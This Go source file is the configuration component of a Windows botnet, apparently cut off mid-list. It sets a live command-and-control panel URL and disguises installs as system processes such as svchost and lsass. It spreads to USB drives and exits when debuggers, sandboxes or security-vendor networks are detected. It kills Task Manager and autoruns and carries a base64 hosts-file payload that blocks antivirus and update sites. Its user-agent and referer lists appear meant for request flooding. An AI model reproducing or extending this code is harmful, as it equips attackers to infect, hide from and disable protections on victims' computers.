// Package components icludes functionalities required for the bot
//Some Variables will be Obfuscated to hide from some scans, they are DeObfuscated on call time.
//Check Registry for updated Variables, Override Internal with External.
//Create Registry Entry for Bot to store data (encrypted)
package components

import (
	"os"
	"strings"

	"github.com/MShoaei/w32"
)

//============================================================
//       Be sure to Obfuscate important strings and data
//============================================================

var (
	//============================================================
	//                   Basic Variables
	//============================================================
	httpPanels = [...]string{"https://server4331-mshoaei.fandogh.cloud/"} //HTTP C&C Addresses
	// httpPanels            = [...]string{"http://localhost:9990/"}  //HTTP C&C Addresses
	instanceKey  = "80202e73-067f-4b4c-93f8-d738d1f77f69" //Bots Uniqe ID, Generate here; https://www.guidgen.com/
	installNames = [...]string{                           //Names for the Bot
		// "svchost",
		// "csrss",
		// "rundll32",
		// "winlogon",
		// "smss",
		// "taskhost",
		// "unsecapp",
		// "AdobeARM",
		// "winsys",
		// "jusched",
		// "BCU",
		// "wscntfy",
		// "conhost",
		// "csrss",
		// "dwm",
		// "sidebar",
		// "ADService",
		// "AppServices",
		// "acrotray",
		// "ctfmon",
		// "lsass",
		// "realsched",
		// "spoolsv",
		// "RTHDCPL",
		// "RTDCPL",
		// "MSASCui",
		"ezToFind",
	}
	registryNames = [...]string{ //Registry Entrys for the Bot
		"Trion Softworks",
		// "Mystic Entertainment",
		// "Microsoft Partners",
		// "Client-Server Runtime Subsystem",
		// "Networking Service",
	}
	//============================================================
	//                   Optional Variables
	//============================================================
	checkIP     = [...]string{"http://checkip.amazonaws.com", "http://myip.dnsdynamic.org", "http://ip.dnsexit.com"} //$_SERVER['REMOTE_ADDR']
	maxMind     = deobfuscate("iuuqt;00xxx/nbynjoe/dpn0hfpjq0w3/20djuz0nf")                                          //Gets IP information
	uTorrnetURL = "http://download.ap.bittorrent.com/track/stable/endpoint/utorrent/os/windows"                      //URL to download uTorrent from
	//	xmrMinerURL          string = "https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"                                                                 //URL to the Miner.exe
	tmpPath     = os.Getenv("APPDATA") + "\\" //APPDATA err, Roaming
	winDirPath  = os.Getenv("WINDIR") + "\\"  //Windows
	rawHTMLPage = "404 page not found"        //What the defult HTML for hosting will say.
	//	binderMark           string = "-00800-"                                                                                                                      //To check if the files been infected by this bot
	driveNames     = [...]string{"A", "B", "D", "E", "F", "G", "H", "I", "J", "X", "Y", "Z"} //Drive Letters to Spread too, USB mainly.
	spreadNames    = [...]string{"USBDriver", "Installer", "Setup", "Install"}               //Names for the bot to spread under
	debugBlacklist = [...]string{                                                            //Debug Programs, Exit bot if detected
		"NETSTAT",
		"FILEMON",
		"PROCMON",
		"REGMON",
		"CAIN",
		"NETMON",
		"Tcpview",
		"vpcmap",
		"vmsrvc",
		"vmusrvc",
		"wireshark",
		"VBoxTray",
		"VBoxService",
		"IDA",
		"WPE PRO",
		"The Wireshark Network Analyzer",
		"WinDbg",
		"OllyDbg",
		"Colasoft Capsa",
		"Microsoft Network Monitor",
		"Fiddler",
		"SmartSniff",
		"Immunity Debugger",
		"Process Explorer",
		"PE Tools",
		"AQtime",
		"DS-5 Debug",
		"Dbxtool",
		"Topaz",
		"FusionDebug",
		"NetBeans",
		"Rational Purify",
		".NET Reflector",
		"Cheat Engine",
		"Sigma Engine",
	}
	processBlacklist  = [...]string{"msconfig", "autoruns", "taskmgr"} //Processes that Anti-Process will auto kill
	campaignWhitelist = [...]string{                                   //Countrys that the bot is allowed to install in
		"United States", "Canada", "China", "Netherlands", "Singapore",
		"United Kingdom", "Finland", "Russia", "Germany", "Israel",
		"South Korea", "Japan",
	}
	organizationBlacklist = [...]string{ //Organizations that do testing/Debugging/Anti-Virus work
		"Amazon",
		"anonymous",
		"BitDefender",
		"BlackOakComputers",
		"Blue Coat",
		"BlueCoat",
		"Cisco",
		"cloud",
		"Data Center",
		"DataCenter",
		"DataCentre",
		"dedicated",
		"ESET, Spol",
		"FireEye",
		"ForcePoint",
		"Fortinet",
		"Hetzner",
		"hispeed.ch",
		"hosted",
		"Hosting",
		"Iron Port",
		"IronPort",
		"LeaseWeb",
		"MessageLabs",
		"Microsoft",
		"MimeCast",
		"NForce",
		"Ovh Sas",
		"Palo Alto",
		"ProofPoint",
		"Rackspace",
		"security",
		"Server",
		"Strong Technologies",
		"Trend Micro",
		"TrendMicro",
		"TrustWave",
		"VMVault",
		"Zscaler",
	}
	hostlist        = `CgkJMTI3LjAuMC4xIGxvY2FsaG9zdAoJCTEyNy4wLjAuMSByYWRzLm1jYWZlZS5jb20KCQkxMjcuMC4wLjEgdGhyZWF0ZXhwZXJ0LmNvbQoJCTEyNy4wLjAuMSB2aXJ1c3NjYW4uam90dGkub3JnCgkJMTI3LjAuMC4xIHNjYW5uZXIubm92aXJ1c3RoYW5rcy5vcmcKCQkxMjcuMC4wLjEgdmlyc2Nhbi5vcmcKCQkxMjcuMC4wLjEgc3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIHVwZGF0ZS5zeW1hbnRlYy5jb20KCQkxMjcuMC4wLjEgY3VzdG9tZXIuc3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIG1jYWZlZS5jb20KCQkxMjcuMC4wLjEgdXMubWNhZmVlLmNvbQoJCTEyNy4wLjAuMSBtYXN0Lm1jYWZlZS5jb20KCQkxMjcuMC4wLjEgZGlzcGF0Y2gubWNhZmVlLmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZC5tY2FmZWUuY29tCgkJMTI3LjAuMC4xIHNvcGhvcy5jb20KCQkxMjcuMC4wLjEgc3ltYW50ZWNsaXZldXBkYXRlLmNvbQoJCTEyNy4wLjAuMSBsaXZldXBkYXRlLnN5bWFudGVjbGl2ZXVwZGF0ZS5jb20KCQkxMjcuMC4wLjEgc2VjdXJpdHlyZXNwb25zZS5zeW1hbnRlYy5jb20KCQkxMjcuMC4wLjEgdmlydXNsaXN0LmNvbQoJCTEyNy4wLjAuMSBmLXNlY3VyZS5jb20KCQkxMjcuMC4wLjEga2FzcGVyc2t5LmNvbQoJCTEyNy4wLjAuMSBrYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wLjEgYXZwLmNvbQoJCTEyNy4wLjAuMSBuZXR3b3JrYXNzb2NpYXRlcy5jb20KCQkxMjcuMC4wLjEgY2EuY29tCgkJMTI3LjAuMC4xIG15LWV0cnVzdC5jb20KCQkxMjcuMC4wLjEgbmFpLmNvbQoJCTEyNy4wLjAuMSB0c2VjdXJlLm5haS5jb20KCQkxMjcuMC4wLjEgdmlydXN0b3RhbC5jb20KCQkxMjcuMC4wLjEgdHJlbmRtaWNyby5jb20KCQkxMjcuMC4wLjEgZ3Jpc29mdC5jb20KCQkxMjcuMC4wLjEgZWxlbWVudHNjYW5uZXIuY29tCgkJMTI3LjAuMC4xIGFjY291bnQubm9ydG9uLmNvbQoJCTEyNy4wLjAuMSBibGVlcGluZ2NvbXB1dGVyLmNvbQoJCTEyNy4wLjAuMSBtYWxla2FsLmNvbQoJCTEyNy4wLjAuMSBhY2NvdW50cy5jb21vZG8uY29tCgkJMTI3LjAuMC4xIGFjdGl2YXRpb24uYWR0cnVzdG1lZGlhLmNvbQoJCTEyNy4wLjAuMSBhY3RpdmF0aW9uLXYyLmthc3BlcnNreS5jb20KCQkxMjcuMC4wLjEgYXV0aC5mZi5hdmFzdC5jb20KCQkxMjcuMC4wLjEgYXZzdGF0cy5hdmlyYS5jb20KCQkxMjcuMC4wLjEgYmFja3VwMS5idWxsZ3VhcmQuY29tCgkJMTI3LjAuMC4xIGJ1ZGR5LmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuMSBjMi5kZXYuZHJ3ZWIuY29tCgkJMTI3LjAuMC4xIGFudGl2aXJ1cy5iYWlkdS5jb20KCQkxMjcuMC4wLjEgY2RuLnN0YXRpYy5tYWx3YXJlYnl0ZXMub3JnCgkJMTI3LjAuMC4xIGNzYXNtYWluLnN5bWFudGVjLmNvbQoJCTEyNy4wLjAuMSBkZWZpbml0aW9uc2JkLmxhdmFzb2Z0LmNvbQoJCTEyNy4wLjAuMSBkbS5rYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wLjEgZG5zc2Nhbi5zaGFkb3dzZXJ2ZXIub3JnCgkJMTI3LjAuMC4xIGRvd25sb2FkLmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZC5idWxsZ3VhcmQuY29tCgkJMTI3LjAuMC4xIGRvd25sb2FkLmNvbW9kby5jb20KCQkxMjcuMC4wLjEgZG93bmxvYWQuZXNldC5jb20KCQkxMjcuMC4wLjEgZG93bmxvYWQuZ2VvLmRyd2ViLmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZG5hZGEubGF2YXNvZnQuY29tCgkJMTI3LjAuMC4xIGRvd25sb2Fkcy5jb21vZG8uY29tCgkJMTI3LjAuMC4xIGRvd25sb2Fkcy5sYXZhc29mdC5jb20KCQkxMjcuMC4wLjEgcmVhc29uY29yZXNlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSBkcndlYi5jb20KCQkxMjcuMC4wLjEgZWMuc3VuYmVsdHNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBlbXVwZGF0ZS5hdmFzdC5jb20KCQkxMjcuMC4wLjEgZXNldG5vZDMyLnJ1CgkJMTI3LjAuMC4xIHppbGx5YS51YQoJCTEyNy4wLjAuMSBleHBpcmUuZXNldC5jb20KCQkxMjcuMC4wLjEgZ21zLmFobmxhYi5jb20KCQkxMjcuMC4wLjEgZ28uZXNldC5ldQoJCTEyNy4wLjAuMSBpMS5jLmVzZXQuY29tCgkJMTI3LjAuMC4xIGkyLmMuZXNldC5jb20KCQkxMjcuMC4wLjEgaTMuYy5lc2V0LmNvbQoJCTEyNy4wLjAuMSBpNC5jLmVzZXQuY29tCgkJMTI3LjAuMC4xIGlwbG9jLmVzZXQuY29tCgkJMTI3LjAuMC4xIGlwbS5hdmlyYS5jb20KCQkxMjcuMC4wLjEgaXBtLmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuMSBrc240LTEyLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tZmlsZS1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi1pbmZvLWdlby5rYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wLjEga3NuLWlwbS0xLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24ta2FzLWdlby5rYXNwZXJza3ktbGFicy5jb20KCQkxMjcuMC4wLjEga3NuLWtkZGkua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi1wYnMtZ2VvLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tc3RhdC1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi10Ym9vdC0xLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tdGNlcnQtZ2VvLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tdHBjZXJ0LTEua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGtzbi11cmwtZ2VvLmthc3BlcnNreS1sYWJzLmNvbQoJCTEyNy4wLjAuMSBrc24tdmVyZGljdC1nZW8ua2FzcGVyc2t5LWxhYnMuY29tCgkJMTI3LjAuMC4xIGxpY2Vuc2VhY3RpdmF0aW9uLnNlY3VyaXR5LmNvbW9kby5jb20KCQkxMjcuMC4wLjEgbGljZW5zZS5hdmlyYS5jb20KCQkxMjcuMC4wLjEgbGljZW5zZS5uYW5vYXYucnUKCQkxMjcuMC4wLjEgbGljZW5zZS50cnVzdHBvcnQuY29tCgkJMTI3LjAuMC4xIGxpY2Vuc2luZy5zZWN1cml0eS5jb21vZG8uY29tCgkJMTI3LjAuMC4xIGxvZ2luLmJ1bGxndWFyZC5jb20KCQkxMjcuMC4wLjEgbG9naW4ubm9ydG9uLmNvbQoJCTEyNy4wLjAuMSBtZXRyaWNzLmJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuMSBtaXJyb3IwMS5nZGF0YS5kZQoJCTEyNy4wLjAuMSBteS5iaXRkZWZlbmRlci5jb20KCQkxMjcuMC4wLjEgbmV3dG9uLm5vcm1hbi5jb20KCQkxMjcuMC4wLjEgbmltYnVzLmJpdGRlZmVuZGVyLm5ldAoJCTEyNy4wLjAuMSBuaXVmb3VyLm5vcm1hbi5ubwoJCTEyNy4wLjAuMSBuaXVvbmUubm9ybWFuLm5vCgkJMTI3LjAuMC4xIG5pdXNldmVuLm5vcm1hbi5ubwoJCTEyNy4wLjAuMSBvMi5ub3J0b24uY29tCgkJMTI3LjAuMC4xIG9tbmkuYXZnLmNvbQoJCTEyNy4wLjAuMSBvbXMuc3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIHAwMDMuc2IuYXZhc3QuY29tCgkJMTI3LjAuMC4xIHAuZmlsc2VjbGFiLmNvbQoJCTEyNy4wLjAuMSBwaW5nLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBwcmVtaXVtLmF2aXJhLXVwZGF0ZS5jb20KCQkxMjcuMC4wLjEgcHJvZ3JhbS5hdmFzdC5jb20KCQkxMjcuMC4wLjEgcHJveHkuZXNldC5jb20KCQkxMjcuMC4wLjEgcmVkaXJlY3QuYXZpcmEuY29tCgkJMTI3LjAuMC4xIHJlZzAzLmVzZXQuY29tCgkJMTI3LjAuMC4xIHJlZ2lzdGVyLms3Y29tcHV0aW5nLmNvbQoJCTEyNy4wLjAuMSByZXNvbHZlcjEuYnVsbGd1YXJkLmN0bWFpbC5jb20KCQkxMjcuMC4wLjEgcmVzb2x2ZXIyLmJ1bGxndWFyZC5jdG1haWwuY29tCgkJMTI3LjAuMC4xIHJlc29sdmVyMy5idWxsZ3VhcmQuY3RtYWlsLmNvbQoJCTEyNy4wLjAuMSByZXNvbHZlcjQuYnVsbGd1YXJkLmN0bWFpbC5jb20KCQkxMjcuMC4wLjEgcmVzb2x2ZXI1LmJ1bGxndWFyZC5jdG1haWwuY29tCgkJMTI3LjAuMC4xIHJvbC5wYW5kYXNlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSAzNjB0b3RhbHNlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSBzZWN1cmUuY29tb2RvLm5ldAoJCTEyNy4wLjAuMSBzaGFzdGEtcnJzLnN5bWFudGVjLmNvbQoJCTEyNy4wLjAuMSBzaG9wLmVzZXRub2QzMi5ydQoJCTEyNy4wLjAuMSBzbGN3LmZmLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBzcG9jLXBvb2wtZ3RtLm5vcnRvbi5jb20KCQkxMjcuMC4wLjEgcy5wcm9ncmFtLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBzdGF0aWMyLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBzdGF0aWMuYXZnLmNvbQoJCTEyNy4wLjAuMSBzdGF0cy5ub3J0b24uY29tCgkJMTI3LjAuMC4xIHN0YXRzLnFhbGFicy5zeW1hbnRlYy5jb20KCQkxMjcuMC4wLjEgc3RvcmUubGF2YXNvZnQuY29tCgkJMTI3LjAuMC4xIHN1LmZmLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSBzdXBwb3J0Lm5vcnRvbi5jb20KCQkxMjcuMC4wLjEgc3ltYW50ZWMudHQub210cmRjLm5ldAoJCTEyNy4wLjAuMSB0aHJlYXRuZXQudGhyZWF0dHJhY2suY29tCgkJMTI3LjAuMC4xIHRyYWNlLmVzZXQuY29tCgkJMTI3LjAuMC4xIHRyYWNraW5nLmxhdmFzb2Z0LmNvbQoJCTEyNy4wLjAuMSB0cy1jcmwud3Muc3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIHRzLmVzZXQuY29tCgkJMTI3LjAuMC4xIHVjLmNsb3VkLmF2Zy5jb20KCQkxMjcuMC4wLjEgdW0wMS5lc2V0LmNvbQoJCTEyNy4wLjAuMSB1bTIxLmVzZXQuY29tCgkJMTI3LjAuMC4xIHVwZGF0ZTIuYnVsbGd1YXJkLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGUuYXZnLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGUuYnVsbGd1YXJkLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGUuZXNldC5jb20KCQkxMjcuMC4wLjEgdXBkYXRlcy5hZ25pdHVtLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGVzLms3Y29tcHV0aW5nLmNvbQoJCTEyNy4wLjAuMSB1cGRhdGVzLnN1bmJlbHRzb2Z0d2FyZS5jb20KCQkxMjcuMC4wLjEgdXBncmFkZS5iaXRkZWZlbmRlci5jb20KCQkxMjcuMC4wLjEgdXBnci1tbXhpaWktcC5jZG4uYml0ZGVmZW5kZXIubmV0CgkJMTI3LjAuMC4xIHVwZ3ItbW14aXYuY2RuLmJpdGRlZmVuZGVyLm5ldAoJCTEyNy4wLjAuMSB2Ny5zdGF0cy5hdmFzdC5jb20KCQkxMjcuMC4wLjEgdmVyc2lvbmNoZWNrLmVzZXQuY29tCgkJMTI3LjAuMC4xIHZsLmZmLmF2YXN0LmNvbQoJCTEyNy4wLjAuMSB3YW0ucGFuZGFzZWN1cml0eS5jb20KCQkxMjcuMC4wLjEgd2VicHJvdC5hdmdhdGUubmV0CgkJMTI3LjAuMC4xIHdlYnByb3QuYXZpcmEuY29tCgkJMTI3LjAuMC4xIHdlYnByb3QuYXZpcmEuZGUKCQkxMjcuMC4wLjEgd3NteS5wYW5kYXNlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSBkb3dubG9hZC5zcC5mLXNlY3VyZS5jb20KCQkxMjcuMC4wLjEgd3d3LXNlY3VyZS5zeW1hbnRlYy5jb20KCQkxMjcuMC4wLjEgc3VuYmVsdHNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSB0cnVzdHBvcnQuY29tCgkJMTI3LjAuMC4xIGthc3BlcnNreS5ydQoJCTEyNy4wLjAuMSBhdmFzdC5ydQoJCTEyNy4wLjAuMSBmcmVlYXZnLmNvbQoJCTEyNy4wLjAuMSBmcmVlLmF2Zy5jb20KCQkxMjcuMC4wLjEgZnJlZS5hdmcuY29tCgkJMTI3LjAuMC4xIGF2aXJhLmNvbQoJCTEyNy4wLjAuMSB6LW9sZWcuY29tCgkJMTI3LjAuMC4xIGJpdGRlZmVuZGVyLmNvbQoJCTEyNy4wLjAuMSBidWxsZ3VhcmQuY29tCgkJMTI3LjAuMC4xIHBlcnNvbmFsZmlyZXdhbGwuY29tb2RvLmNvbQoJCTEyNy4wLjAuMSBjb21vZG8uY29tCgkJMTI3LjAuMC4xIGRyd2ViLmNvbQoJCTEyNy4wLjAuMSBlbXNpc29mdC5ydQoJCTEyNy4wLjAuMSBhdmVzY2FuLnJ1CgkJMTI3LjAuMC4xIGVzY2FuYXYuY29tCgkJMTI3LjAuMC4xIGVzY2FuLmNvbQoJCTEyNy4wLjAuMSBmLXByb3QuY29tCgkJMTI3LjAuMC4xIGYtc2VjdXJlLmNvbQoJCTEyNy4wLjAuMSBnZGF0YXNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBydS5nZGF0YXNvZnR3YXJlLmNvbQoJCTEyNy4wLjAuMSBnZGF0YS5kZQoJCTEyNy4wLjAuMSBpa2FydXNzZWN1cml0eS5jb20KCQkxMjcuMC4wLjEgbWFsd2FyZWJ5dGVzLm9yZwoJCTEyNy4wLjAuMSBuYW5vYXYucnUKCQkxMjcuMC4wLjEgc3ltYW50ZWMuY29tCgkJMTI3LjAuMC4xIG5vcnRvbi5jb20KCQkxMjcuMC4wLjEgcnUubm9ydG9uLmNvbQoJCTEyNy4wLjAuMSBhZ25pdHVtLnJ1CgkJMTI3LjAuMC4xIGNsb3VkYW50aXZpcnVzLmNvbQoJCTEyNy4wLjAuMSBwYW5kYXNlY3VyaXR5LmNvbQoJCTEyNy4wLjAuMSByaXNpbmcuY29tLmNuCgkJMTI3LjAuMC4xIHJpc2luZy1nbG9iYWwuY29tCgkJMTI3LjAuMC4xIHJpc2luZy1ydXNzaWEuY29tCgkJMTI3LjAuMC4xIGZyZWVyYXYuY29tCgkJMTI3LjAuMC4xIHNhZmVuc29mdC5ydQoJCTEyNy4wLjAuMSB0cnVzdHBvcnQuY29tCgkJMTI3LjAuMC4xIHZpcnVzdG90YWwuY29tCgkJMTI3LjAuMC4xIHppbGx5YS5jb20KCQkxMjcuMC4wLjEgYW50aS12aXJ1cy5ieQoJCTEyNy4wLjAuMSBzb3Bob3MuY29tCgkJMTI3LjAuMC4xIGZyZWVkcndlYi5jb20KCQkxMjcuMC4wLjEgYXZnLmNvbQoJCTEyNy4wLjAuMSBtY2FmZWUuY29tCgkJMTI3LjAuMC4xIHNpdGVhZHZpc29yLmNvbQoJCTEyNy4wLjAuMSBzdXBwb3J0Lmthc3BlcnNreS5ydQoJCTEyNy4wLjAuMSBjb21zcy5ydQoJCTEyNy4wLjAuMSBzcHl3YXJlLXJ1LmNvbQoJCTEyNy4wLjAuMSB2aXJ1c2luZm8uaW5mbwoJCTEyNy4wLjAuMSBmb3J1bS5lc2V0bm9kMzIucnUKCQkxMjcuMC4wLjEgZm9ydW0uZHJ3ZWIuY29tCgkJMTI3LjAuMC4xIGZvcnVtLnZpcmxhYi5pbmZvCgkJMTI3LjAuMC4xIHNweWJvdC5pbmZvCgkJMTI3LjAuMC4xIHdpbnBhdHJvbC5jb20KCQkxMjcuMC4wLjEgcXVpY2to`
	headersReferers = []string{ //Referers
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
		"http://duckduckgo.com/?q=",
		"http://www.search.com/web?q=",
	}
	headersUseragents = []string{ //Useragents
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
		"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
		"Opera/9.20 (Windows NT 6.0; U; en)",
		"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
		"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
		"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
		"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
		"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
		"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
		"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
		"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
		"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
		"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; da-dk) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
		"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
		"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
		"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
		"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
		"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 5.0; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130331 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20130401 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20100101 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0",
